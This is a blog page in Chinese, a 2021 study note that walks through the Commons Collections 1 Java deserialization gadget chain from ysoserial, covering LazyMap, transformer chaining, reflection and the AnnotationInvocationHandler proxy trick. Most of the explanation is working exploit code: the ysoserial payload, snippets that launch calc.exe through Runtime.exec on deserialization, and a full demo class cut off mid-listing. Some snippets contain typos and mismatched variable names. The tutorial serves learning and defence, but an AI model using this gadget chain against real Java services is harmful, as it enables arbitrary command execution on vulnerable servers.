@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Commons Collections1 - NoMuggle - To record my tech and my life</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="ssspallow" /><meta name="description" content="在写这篇学习笔记之前，我看了许多篇网上的文章， 发现它们都没有它们所声称的那么容易好理解。 在我完全搞懂这个漏洞之后， 我发现这个漏洞最难的地方并" /><meta name="keywords" content="security, python, node.js" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.89.4 with theme even" />
+
+
+<link rel="canonical" href="https://www.nomuggle.com/post/commons-collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/commonscollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b5a744db6de49a86cadafb3b70f555ab443f83c307a483402259e94726b045ff.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Commons Collections1" />
+<meta property="og:description" content="在写这篇学习笔记之前，我看了许多篇网上的文章， 发现它们都没有它们所声称的那么容易好理解。 在我完全搞懂这个漏洞之后， 我发现这个漏洞最难的地方并" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.nomuggle.com/post/commons-collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/commonscollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-12-01T20:40:00+08:00" />
+<meta property="article:modified_time" content="2021-12-01T20:40:00+08:00" />
+
+<meta itemprop="name" content="Commons Collections1">
+<meta itemprop="description" content="在写这篇学习笔记之前，我看了许多篇网上的文章， 发现它们都没有它们所声称的那么容易好理解。 在我完全搞懂这个漏洞之后， 我发现这个漏洞最难的地方并"><meta itemprop="datePublished" content="2021-12-01T20:40:00+08:00" />
+<meta itemprop="dateModified" content="2021-12-01T20:40:00+08:00" />
+<meta itemprop="wordCount" content="3654">
+<meta itemprop="keywords" content="java," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Commons Collections1"/>
+<meta name="twitter:description" content="在写这篇学习笔记之前，我看了许多篇网上的文章， 发现它们都没有它们所声称的那么容易好理解。 在我完全搞懂这个漏洞之后， 我发现这个漏洞最难的地方并"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">NoMuggle</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">NoMuggle</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Commons Collections1</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-12-01 </span>
+        <div class="post-category">
+            <a href="/categories/java%E5%AE%89%E5%85%A8/"> java安全 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境">环境</a></li>
+    <li><a href="#各种语法api">各种语法、API</a></li>
+    <li><a href="#commons-collections">commons-collections</a></li>
+    <li><a href="#藏runtimegetruntime">藏Runtime.getRuntime()</a>
+      <ul>
+        <li><a href="#找到调lazymapget的类">找到调lazymap.get的类</a></li>
+      </ul>
+    </li>
+    <li><a href="#transformedmap的gadget">TransformedMap的gadget</a></li>
+    <li><a href="#jdk8u71之后版本不可用的原因">jdk8u71之后版本不可用的原因</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p>在写这篇学习笔记之前，我看了许多篇网上的文章， 发现它们都没有它们所声称的那么容易好理解。</p>
+<p>在我完全搞懂这个漏洞之后， 我发现这个漏洞最难的地方并不是说调用链有多复杂，而是我对这个漏洞涉及到的api完全陌生。</p>
+<p>如果你已经了解了java反射，反序列化漏洞， commons-collections相关api， 动态代理， 再来看这个漏洞，半个小时应该就能搞懂。</p>
+<p>因此对那些想搞懂这个漏洞的人， 最好的方法是对这些不熟悉的api写一些测试代码， 当你对api的使用了解了，构造gadget不过是水到渠成的事情罢了。</p>
+<h2 id="环境">环境</h2>
+<p>还是从ysoserial的payload里，我们看到环境条件如下:</p>
+<ul>
+<li>jdk版本小于jdk8u71</li>
+<li>commons-collections等于3.1</li>
+</ul>
+<p>我们下载一个jdk1.7， 更新pom.xml commons-collections依赖等于3.1。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> &lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="各种语法api">各种语法、API</h2>
+<p>先看下ysoserial的payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">public InvocationHandler getObject(final String command) throws Exception {
+    final String[] execArgs = new String[] { command };
+    // inert chain for setup
+    final Transformer transformerChain = new ChainedTransformer(
+        new Transformer[]{ new ConstantTransformer(1) });
+    // real chain for after setup
+    final Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&#34;getMethod&#34;, new Class[] {
+                String.class, Class[].class }, new Object[] {
+                &#34;getRuntime&#34;, new Class[0] }),
+            new InvokerTransformer(&#34;invoke&#34;, new Class[] {
+                Object.class, Object[].class }, new Object[] {
+                null, new Object[0] }),
+            new InvokerTransformer(&#34;exec&#34;,
+                new Class[] { String.class }, execArgs),
+            new ConstantTransformer(1) };
+
+    final Map innerMap = new HashMap();
+
+    final Map lazymapMap = LazyMap.decorate(innerMap, transformerChain);
+
+    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+
+    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+
+    Reflections.setFieldValue(transformerChain, &#34;iTransformers&#34;, transformers); // arm with actual transformer chain
+
+    return handler;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>涉及到了commons-collections相关的api，反射， 动态代理等，接下来我们将逐一解释各api，并给出测试代码， 如果你光看代码没法理解，最好手抄到IDE里面调试一遍。</p>
+<h2 id="commons-collections">commons-collections</h2>
+<p>首先是commons-collections的api，有如下这些</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.map.LazyMap;
+</code></pre></td></tr></table>
+</div>
+</div><p>我们先来看LazyMap，顾名思义， LazyMap是“懒加载”的，在它取不到值时， 它会在我们自定义的函数里面生成一个值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Factory factory = new Factory() {
+    public Object create() {
+        return new Date();
+    }
+};
+Map lazymap = LazyMap.decorate(new HashMap(), factory);
+Object obj = lazy.get(&#34;NOW&#34;);
+System.out.println(obj);
+Object obj1 = lazy.get(&#34;NOW&#34;);
+System.out.println(obj1);
+</code></pre></td></tr></table>
+</div>
+</div><p>在第一次，lazy里面没有NOW的值时，它会调用我们事先写好的factory方法，给它赋一个值，第二次就可以直接拿那个值了。</p>
+<p>LazyMap.decorate有两个重载方法，一个是传Factory, 一个是传Transformer, 我们现在要用的就是第二个</p>
+<p><img src="../img_2.png" alt="img_2.png"></p>
+<p>再看一下第二个的例子:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Transformer transformer = new ConstantTransformer(1);
+Map lazymap = LazyMap.decorate(new HashMap(), transformer);
+Object obj = lazy.get(&#34;NOW&#34;);
+System.out.println(obj);
+</code></pre></td></tr></table>
+</div>
+</div><p>这个例子我们用到了ConstantTransformer。</p>
+<p>这里要先说一下，当lazy.get(&ldquo;NOW&rdquo;) 调用时，发生了什么呢？  它调用了ConstantTransformer的transform方法， 不管是ConstantTransformer还是InvokerTransformer
+还是其他Transformer， 只要它被传入LazyMap.decorate的第二个参数，当懒加载触发了就会调用该Transformer的transform方法！</p>
+<p>ConstantTransformer， 顾名思义， 它返回了一个常数， 上面的例子就打印了1</p>
+<p>接着来看InvokerTransformer, 使用方法和ConstantTransformer是一样的，刚刚说了transform方法最重要，我们就来看它的transform方法</p>
+<p><img src="../img_3.png" alt="img_3.png"></p>
+<p>经典的反射应用，只要控制input， iMethodName和iParamTypes就能为所欲为了。 看下为所欲为的测试代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Transformer transformer = new InvokerTransformer(&#34;exec&#34;, new Class[] {
+                String.class}, new Object[] {&#34;calc.exe&#34; });
+Map lazymap = LazyMap.decorate(new HashMap(), transformer);
+Object obj = lazy.get(Runtime.getRuntime());
+System.out.println(obj);
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="../img_4.png" alt="img_4.png"></p>
+<p>确实为所欲为了！</p>
+<p>再加上我们的序列化、反序列化代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Transformer transformer = new InvokerTransformer(&#34;exec&#34;, new Class[] {
+                String.class}, new Object[] {&#34;calc.exe&#34; });
+Map lazymap = LazyMap.decorate(new HashMap(), transformer);
+
+ByteArrayOutputStream barr = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(barr);
+oos.writeObject(lazy);
+oos.close();
+
+ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+Map o = (Map) in.readObject();
+Object obj = o.get(Runtime.getRuntime());
+</code></pre></td></tr></table>
+</div>
+</div><p>着重看我们的最后一行， <code>Object obj = o.get(Runtime.getRuntime());</code> ， 由反序列知识，我们知道，在反序列化时类的readObject方法会自动调用。</p>
+<p>那么，我们只要找到一个类， 它的readObject方法可以有lazymap.get方法调用，同时lazymap.get的参数为Runtime.getRuntime()， 我们的漏洞就触发成功了！</p>
+<p>然而有这样的类吗？ 大概率是没有的，反正大家都没找到。</p>
+<p>那么我们可以把剩下的问题总结一下， 还剩下两个问题：</p>
+<ul>
+<li>第一：我们得把我们的Runtime.getRuntime().exec()藏在LazyMap.decorate的第二个参数里面</li>
+<li>第二: 我们得找到一个类，可以调用我们的lazymap.get方法</li>
+</ul>
+<h2 id="藏runtimegetruntime">藏Runtime.getRuntime()</h2>
+<p>再看看InvokerTransformer的transform函数</p>
+<p><img src="../img_5.png" alt="img_5.png"></p>
+<p>参数input是lazymap.get的参数， 这样貌似怎样都藏不住了。 还有什么方法吗？</p>
+<p>有！ 这时候我们再看ysoserial的payload，看到里面有个ChainedTransformer， 我们看看它是干嘛的</p>
+<p><img src="../img_6.png" alt="img_6.png"></p>
+<p>很简单， 传入一个Transformer数组， 然后在lazymap.get的时候按顺序调用Transformer数组里面的transform函数，
+前一个Transformer的transform函数的返回值喂给下一个Transformer的transform函数， 跟人体蜈蚣一样。</p>
+<p>那么我们就可以来构造藏住Runtime.getRuntime()的代码了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc.exe&#34;})
+        };
+
+Transformer chainedTransformer = new ChainedTransformer(transformers);
+Map lazymap = LazyMap.decorate(new HashMap(), chainedTransformer);
+
+lazymap.get(&#34;xxx&#34;);
+</code></pre></td></tr></table>
+</div>
+</div><p>运行后计算器出来了，可以看到，我们不用再往lazymap.get参数里传Runtime.getRuntime()， 传入任意参数，都可触发了。</p>
+<p>加入反序列化代码， 运行：</p>
+<p><img src="../img_7.png" alt="img_7.png"></p>
+<p>报错了。 原因很简单，因为Runtime类没有实现<code>java.io.Serializable</code>接口。 解决方法也很简单，用<em>反射</em>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&#34;getMethod&#34;, new Class[] {
+                String.class, Class[].class }, new Object[] {
+                &#34;getRuntime&#34;, new Class[0] }),
+        new InvokerTransformer(&#34;invoke&#34;, new Class[] {
+                Object.class, Object[].class }, new Object[] {
+                null, new Object[0] }),
+        new InvokerTransformer(&#34;exec&#34;,
+                new Class[] { String.class }, new String[]{&#34;calc.exe&#34;}),
+         };
+
+Transformer chainedTra`nsformer = new ChainedTransformer(transformers);
+Map lazymap = LazyMap.decorate(new HashMap(), chainedTransformer);
+
+lazymap.get(&#34;xxx&#34;);`
+</code></pre></td></tr></table>
+</div>
+</div><p>上面代码粗看可能难以理解，我们可以把问题简化为：</p>
+<p>在只输入Runtime.class的情况下，经过ChainedTransformer的transform， 如何调用到Runtime.getruntime.exec函数， 带着这个目的调试，很快就能理解。</p>
+<h3 id="找到调lazymapget的类">找到调lazymap.get的类</h3>
+<p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
+<p><img src="../img_8.png" alt="img_8.png"></p>
+<p>值得注意的是， 这个lazymap.get的调用并不是在AnnotationInvocationHandler的readObject方法中,而是在invoke方法中，而且这个invoke方法
+也没有被readObject方法调用。因此我们得想个办法触发invoke函数。 这就涉及到了<em>动态代理</em>的知识了。</p>
+<p>所谓动态代理，就是不编写实现类，直接在运行期创建某个interface的实例。 如果你不知道什么是动态代理，可参考下面文章理解，不然将无法搞懂下面的代码：</p>
+<ul>
+<li><a href="https://www.jianshu.com/p/9bcac608c714">https://www.jianshu.com/p/9bcac608c714</a></li>
+<li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0</a></li>
+</ul>
+<p>那么因为AnnotationInvocationHandler实现了InvocationHandler接口，我们可以以AnnotationInvocationHandler构造一个handle, 这样它的
+invoke方法就会在代理函数调用方法时自动调用了。具体代码如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Map lazyMap = LazyMap.decorate(innerMap, transformerChain1);
+
+Class clazz = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
+
+Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+constructor.setAccessible(true);
+
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
+
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);
+
+proxyMap.getClass().getMethod(&#34;invoke&#34;);
+handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+</code></pre></td></tr></table>
+</div>
+</div><p>其中Retention.class只是为了调用AnnotationInvocationHandler的构造函数传入的符合类型的参数，可以是任意实现了Annotation的类</p>
+<p><img src="../img_9.png" alt="img_9.png"></p>
+<p>在这里随便找一个就行了：</p>
+<p><img src="../img_10.png" alt="img_10.png"></p>
+<p>把所有代码汇总一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">CommonCollection</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ConstantTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="kd">map</span><span class="p">.</span><span class="nx">LazyMap</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">annotation</span><span class="p">.</span><span class="nx">Retention</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Constructor</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">InvocationHandler</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Proxy</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">HashMap</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Map</span><span class="p">;</span>
+
+<span class="nx">public</span> <span class="nx">class</span> <span class="nx">demo</span> <span class="p">{</span>
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+        <span class="nx">Transformer</span><span class="p">[]</span> <span class="nx">transformers</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">Transformer</span><span class="p">[]</span> <span class="p">{</span>
+                <span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">class</span><span class="p">),</span>
+                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span>
+                        <span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Class</span><span class="p">[].</span><span class="nx">class</span> <span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]</span> <span class="p">{</span>
+                        <span class="s">&#34;getRuntime&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">}),</span>
+                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]</span> <span class="p">{</span>
+                        <span class="nx">Object</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Object</span><span class="p">[].</span><span class="nx">class</span> <span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]</span> <span class="p">{</span>
+                        <span class="nx">null</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">}),</span>
+                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span>
